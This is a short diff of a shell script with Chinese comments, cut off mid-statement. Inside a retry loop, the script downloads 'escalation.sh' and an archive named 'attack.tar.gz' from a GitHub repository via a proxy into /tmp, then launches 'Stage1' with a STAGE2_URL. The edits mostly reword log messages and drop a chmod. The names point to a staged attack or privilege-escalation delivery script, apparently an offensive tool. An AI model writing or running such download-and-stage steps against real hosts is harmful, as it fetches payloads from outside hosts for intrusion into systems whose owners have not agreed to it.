@@ -120,18 +120,20 @@ while [ $attempt -le $MAX_RETRIES ]; do
         log_success "escalation.sh 已成功下载到 $ESCALATION_SH"
     fi
 
-    # ===================== 下载 escalation.sh 到 /tmp =====================
-    log_info "准备下载 attack.tar.gz 到固定位置: $ESCALATION_SH"
+    # ===================== 下载 attack.tar.gz 到 /tmp =====================
+    log_info "准备下载 attack.tar.gz 到 /tmp"
 
     if ! wget -q --no-cache --tries=3 --timeout=15 \
-            "https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz" -O "/tmp/attack.tar.gz"; then
-        log_error "下载 attack 失败: https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"
-            # 这里你可以选择 exit 1 或者 continue 看需求
-            # exit 1
+        "https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz" \
+        -O "/tmp/attack.tar.gz"; then
+        log_error "下载 attack.tar.gz 失败"
+        # 可选：exit 1   # 如果失败就退出，看你需求
     else
-        chmod 755 "/tmp/attack.tar.gz" 2>/dev/null || true
-        log_success "attack 已成功下载到 /tmp"
+        log_success "attack.tar.gz 已成功下载到 /tmp/attack.tar.gz"
+        # 故意不加 chmod 755，因为压缩包不需要执行权限
     fi
+
+    log_info "下载阶段完成，继续后续操作..."
     log_info "启动 Stage1 (host=$HOST_NAME)"
 
     if STAGE2_URL="$STAGE2_URL" \
